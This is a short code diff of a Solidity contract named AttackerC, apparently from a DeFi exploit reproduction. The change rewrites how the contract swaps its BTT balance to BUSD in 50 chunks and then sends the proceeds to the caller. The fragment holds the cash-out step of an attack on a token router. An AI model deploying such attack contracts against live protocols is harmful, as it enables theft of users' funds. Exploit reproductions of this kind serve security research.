@@ -56,16 +56,22 @@ contract AttackerC {
         uint256 totalBal = IERC20(BTT).balanceOf(address(this));
         uint256 amountPerLoop = totalBal / 50;
 
+        address[2] memory path;
+        path[0] = BTT;
+        path[1] = BUSD;
+
         for (uint256 i; i < 50; i++) {
-            router.call(abi.encodeWithSelector(
-                bytes4(0x700ce627), // swap???
-                BTT, 
-                BUSD, 
-                false, 
+            IRouterBTT(router).swap(
+                path,
+                false,
                 amountPerLoop
-            ));
+            );
         }
 
         IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));
     }
+}
+
+interface IRouterBTT {
+    function swap(address[2] memory path, bool status_b, uint256 amount_) external;
 }
